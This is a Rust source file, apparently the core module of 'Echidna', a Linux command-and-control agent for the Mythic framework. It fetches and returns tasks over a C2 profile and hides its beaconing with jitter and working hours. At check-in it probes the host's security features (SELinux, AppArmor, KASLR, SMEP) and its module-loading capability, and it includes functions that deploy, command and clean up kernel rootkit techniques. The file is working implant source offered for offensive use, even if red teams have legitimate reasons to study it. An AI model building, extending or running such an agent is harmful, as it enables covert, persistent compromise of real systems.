use crate::payloadvars;
use crate::tasking::Tasker;
use crate::bridge::KernelBridge;
use crate::rootkit::{RootkitTechnique, RootkitManager};
use chrono::prelude::{DateTime, NaiveDate};
use chrono::{Duration, Local, NaiveDateTime, NaiveTime};
use rand::Rng;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::collections::HashMap;

use crate::profiles::Profile;
use crate::utils::linux as native;

/// Struct containing the pending task information
#[derive(Debug, Deserialize, Serialize)]
pub struct AgentTask {
    /// The command for the task
    pub command: String,

    /// The parameters of the task (can either contain a raw string or JSON)
    pub parameters: String,

    /// Timestamp of the task
    pub timestamp: f64,

    /// Task id for tracking
    pub id: String,
}

/// Response when grabbing new tasks from Mythic
#[derive(Debug, Deserialize, Serialize)]
pub struct GetTaskingResponse {
    /// List of pending tasks
    pub tasks: Vec<AgentTask>,
}

/// Struct used for sending the completed task information
#[derive(Debug, Deserialize, Serialize)]
pub struct PostTaskingResponse {
    /// Action for the post request
    pub action: String,

    /// List of completed tasking
    pub responses: Vec<serde_json::Value>,
}

/// Used for holding any data which has to be passed along to a background task
#[derive(Debug, Deserialize, Serialize)]
pub struct ContinuedData {
    /// Id of the task
    pub task_id: String,

    /// Status returned from Mythic
    pub status: String,

    /// Whether an error occured or not
    pub error: Option<String>,

    /// File id if downloading a file
    pub file_id: Option<String>,

    /// Total chunks if downloading/uploading a file
    pub total_chunks: Option<u32>,

    /// Current chunk being processed for download/upload tasks
    pub chunk_num: Option<u32>,

    /// The chunk data for download/upload tasks
    pub chunk_data: Option<String>,
}

/// Data which is shared between the agent thread and worker thread
pub struct SharedData {
    /// Sleep interval of the agent
    pub sleep_interval: u64,

    /// Jitter of the agent
    pub jitter: u64,

    /// Flag for signifying that the agent should exit
    pub exit_agent: bool,

    /// Start time of the configured working hours
    pub working_start: NaiveTime,

    /// End time of the configured working hours
    pub working_end: NaiveTime,
}

/// Main Echidna agent struct containing information with regards to C2 communication and rootkit management
pub struct EchidnaAgent {
    /// Data shared between the agent and worker threads
    pub shared: SharedData,

    /// Configured C2 profile (HTTP only for Linux)
    c2profile: Profile,

    /// Agent kill date
    killdate: NaiveDate,

    /// Tasking information for the agent
    pub tasking: Tasker,

    /// Rootkit technique manager
    rootkit_manager: RootkitManager,

    /// Kernel communication bridge
    kernel_bridge: Option<KernelBridge>,

    /// Currently active rootkit technique
    active_technique: Option<String>,

    /// Technique deployment status
    technique_status: HashMap<String, bool>,
}

impl EchidnaAgent {
    /// Creates a new `EchidnaAgent` object
    pub fn new() -> Self {
        let c2profile = Profile::new(payloadvars::payload_uuid());

        // Return a new `EchidnaAgent` object
        Self {
            shared: SharedData {
                jitter: payloadvars::callback_jitter(),
                sleep_interval: payloadvars::callback_interval(),
                exit_agent: false,
                working_start: payloadvars::working_start(),
                working_end: payloadvars::working_end(),
            },
            c2profile,
            tasking: Tasker::new(),
            killdate: NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d").unwrap(),
            rootkit_manager: RootkitManager::new(),
            kernel_bridge: None,
            active_technique: None,
            technique_status: HashMap::new(),
        }
    }

    /// Makes the initial C2 checkin with enhanced system information for rootkit capabilities
    pub fn make_checkin(&mut self) -> Result<(), Box<dyn Error>> {
        // Get the checkin information for Linux including rootkit capability assessment
        let mut json_body = native::get_checkin_info();
        
        // Add rootkit-specific system information
        let rootkit_info = self.assess_rootkit_capabilities()?;
        if let Ok(mut checkin_data) = serde_json::from_str::<serde_json::Value>(&json_body) {
            checkin_data["rootkit_capabilities"] = rootkit_info;
            json_body = serde_json::to_string(&checkin_data)?;
        }

        // Send the checkin information through the configured profile
        self.c2profile.initial_checkin(&json_body)?;

        Ok(())
    }

    /// Assess system capabilities for different rootkit techniques
    fn assess_rootkit_capabilities(&self) -> Result<serde_json::Value, Box<dyn Error>> {
        let mut capabilities = json!({});

        // Check for LKM support
        capabilities["lkm_support"] = json!({
            "kernel_modules_enabled": std::path::Path::new("/proc/modules").exists(),
            "can_load_modules": self.check_module_loading_capability(),
            "kernel_version": self.get_kernel_version(),
            "has_proc_kallsyms": std::path::Path::new("/proc/kallsyms").exists(),
        });

        // Check for eBPF support (future implementation)
        capabilities["ebpf_support"] = json!({
            "bpf_syscall_available": self.check_bpf_support(),
            "kernel_version_compatible": self.check_ebpf_kernel_version(),
        });

        // Check for LD_PRELOAD support (future implementation)
        capabilities["preload_support"] = json!({
            "ld_preload_available": true,
            "glibc_version": self.get_glibc_version(),
        });

        // System security status
        capabilities["security_status"] = json!({
            "selinux_enabled": std::path::Path::new("/sys/fs/selinux").exists(),
            "apparmor_enabled": std::path::Path::new("/sys/kernel/security/apparmor").exists(),
            "kaslr_enabled": self.check_kaslr_status(),
            "smep_enabled": self.check_smep_status(),
        });

        Ok(capabilities)
    }

    /// Check if kernel module loading is possible
    fn check_module_loading_capability(&self) -> bool {
        // Check if we can read /proc/modules and if insmod/modprobe exist
        std::path::Path::new("/proc/modules").exists() && 
        (std::path::Path::new("/sbin/insmod").exists() || 
         std::path::Path::new("/usr/sbin/insmod").exists())
    }

    /// Get kernel version information
    fn get_kernel_version(&self) -> String {
        std::fs::read_to_string("/proc/version")
            .unwrap_or_default()
            .lines()
            .next()
            .unwrap_or("Unknown")
            .to_string()
    }

    /// Check for BPF system call support
    fn check_bpf_support(&self) -> bool {
        // Try to make a simple BPF syscall to test availability
        // This is a basic check - full eBPF support would need more validation
        unsafe {
            let result = libc::syscall(libc::SYS_bpf, 0, std::ptr::null::<libc::c_void>(), 0);
            result != -1 || *libc::__errno_location() != libc::ENOSYS
        }
    }

    /// Check if kernel version supports eBPF
    fn check_ebpf_kernel_version(&self) -> bool {
        // eBPF requires kernel >= 3.18, full features >= 4.1
        // This is a simplified check
        let version = self.get_kernel_version();
        !version.is_empty() && !version.contains("2.") && !version.contains("3.1")
    }

    /// Get glibc version
    fn get_glibc_version(&self) -> String {
        // Try to get glibc version from ldd or other methods
        "Unknown".to_string() // Simplified for now
    }

    /// Check KASLR (Kernel Address Space Layout Randomization) status
    fn check_kaslr_status(&self) -> bool {
        std::fs::read_to_string("/proc/cmdline")
            .map(|content| !content.contains("nokaslr"))
            .unwrap_or(true)
    }

    /// Check SMEP (Supervisor Mode Execution Prevention) status
    fn check_smep_status(&self) -> bool {
        std::fs::read_to_string("/proc/cpuinfo")
            .map(|content| content.contains("smep"))
            .unwrap_or(false)
    }

    /// Deploy a specific rootkit technique
    pub fn deploy_rootkit(&mut self, technique: &str) -> Result<String, Box<dyn Error>> {
        // Initialize kernel bridge if not already done
        if self.kernel_bridge.is_none() {
            self.kernel_bridge = Some(KernelBridge::new()?);
        }

        // Deploy the requested technique
        let result = self.rootkit_manager.deploy_technique(
            technique, 
            self.kernel_bridge.as_mut().unwrap()
        )?;

        // Update status tracking
        self.active_technique = Some(technique.to_string());
        self.technique_status.insert(technique.to_string(), true);

        Ok(result)
    }

    /// Check if a rootkit technique is currently active
    pub fn is_technique_active(&self, technique: &str) -> bool {
        self.technique_status.get(technique).copied().unwrap_or(false)
    }

    /// Execute a command through the active rootkit technique
    pub fn execute_rootkit_command(&mut self, command: &str, params: &str) -> Result<String, Box<dyn Error>> {
        if let Some(ref active) = self.active_technique {
            self.rootkit_manager.execute_command(active, command, params)
        } else {
            Err("No active rootkit technique".into())
        }
    }

    /// Clean up all rootkit techniques
    pub fn cleanup_rootkit(&mut self) -> Result<(), Box<dyn Error>> {
        self.rootkit_manager.cleanup_all()?;
        
        if let Some(ref mut bridge) = self.kernel_bridge {
            bridge.cleanup()?;
        }
        
        self.active_technique = None;
        self.technique_status.clear();
        
        Ok(())
    }

    /// Gets new tasking from Mythic
    pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
        // Create the body for receiving new tasking
        let json_body = json!({
            "action": "get_tasking",
            "tasking_size": -1,
        })
        .to_string();

        // Send the data through the C2 profile to Mythic
        let body = self.c2profile.send_data(&json_body)?;

        // Deserialize the response into a struct
        let response: GetTaskingResponse = serde_json::from_str(&body)?;

        // Return a success and any tasking
        if !response.tasks.is_empty() {
            Ok(Some(response.tasks))
        } else {
            Ok(None)
        }
    }

    /// Sends completed tasking to Mythic
    /// * `completed` - Slice of completed tasks
    pub fn send_tasking(
        &mut self,
        completed: &[serde_json::Value],
    ) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
        // Create the request body with the completed tasking information
        let body = PostTaskingResponse {
            action: "post_response".to_string(),
            responses: completed.to_owned(),
        };

        let req_payload = serde_json::to_string(&body)?;

        // Send the completed task data
        let json_response = self.c2profile.send_data(&req_payload)?;

        // Deserialize the response into a struct
        let response: PostTaskingResponse = serde_json::from_str(&json_response)?;

        // Some background tasks require more information from Mythic in order to continue
        // running (upload/download, rootkit operations). Take the response and create new tasking 
        // for passing along to already running background tasks
        let mut pending_tasks: Vec<AgentTask> = Vec::new();
        for resp in response.responses {
            let completed_data: ContinuedData = serde_json::from_value(resp)?;

            pending_tasks.push(AgentTask {
                command: "continued_task".to_string(),
                parameters: serde_json::to_string(&completed_data)?,
                timestamp: 0.0,
                id: completed_data.task_id,
            });
        }

        // If there are messages that need to be passed to background tasks, return them.
        if !pending_tasks.is_empty() {
            Ok(Some(pending_tasks))
        } else {
            Ok(None)
        }
    }

    /// Sleep the agent for the specified interval and jitter or sleep the agent
    /// if not in the working hours time frame
    pub fn sleep(&mut self) {
        // Check the killdate
        let now: DateTime<Local> = std::time::SystemTime::now().into();
        let now: NaiveDateTime = now.naive_local();

        // Signal that the agent should exit if it has reached the kill date
        if now.date() >= self.killdate {
            self.shared.exit_agent = true;
        }

        // Grab the sleep interval and jitter from the `EchidnaAgent` struct
        let jitter = self.shared.jitter;
        let interval = self.shared.sleep_interval;

        // Calculate the sleep time using the interval and jitter
        let sleep_time = calculate_sleep_time(interval, jitter);

        // Sleep the agent
        std::thread::sleep(std::time::Duration::from_secs(sleep_time));

        // Get the working hours start time from the shared data.
        let working_start = NaiveDateTime::new(now.date(), self.shared.working_start);

        // Get the working hours end time from the shared data.
        let working_end = NaiveDateTime::new(now.date(), self.shared.working_end);

        // Check if the working hours are equal to each other and assume that this
        // means the agent should have a 24 hours active time
        if working_end != working_start {
            let mut sleep_time = std::time::Duration::from_secs(0);

            if now < working_start {
                // Calculate the sleep interval if the current time is before
                // the working hours
                let delta = Duration::seconds(
                    working_start.and_utc().timestamp() - now.and_utc().timestamp(),
                );
                sleep_time = delta.to_std().unwrap();
            } else if now > working_end {
                // Calculate the sleep interval if the current time as after the
                // working hours
                let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
                let delta =
                    Duration::seconds(next_start.and_utc().timestamp() - now.and_utc().timestamp());
                sleep_time = delta.to_std().unwrap();
            }

            std::thread::sleep(sleep_time);
        }
    }
}

/// Calculate the desired sleep time based on the interval and jitter
/// * `interval` - Interval in seconds to sleep
/// * `jitter` - Sleep jitter value between 0-100
pub fn calculate_sleep_time(interval: u64, jitter: u64) -> u64 {
    // Convert the jitter to a random percentage value from 0 to the max jitter value
    let jitter = (rand::thread_rng().gen_range(0..jitter + 1) as f64) / 100.0;

    // Set the actual sleep time by randomly adding or subtracting the jitter from the
    // agent sleep time
    if (rand::random::<u8>()) % 2 == 1 {
        interval + (interval as f64 * jitter) as u64
    } else {
        interval - (interval as f64 * jitter) as u64
    }
}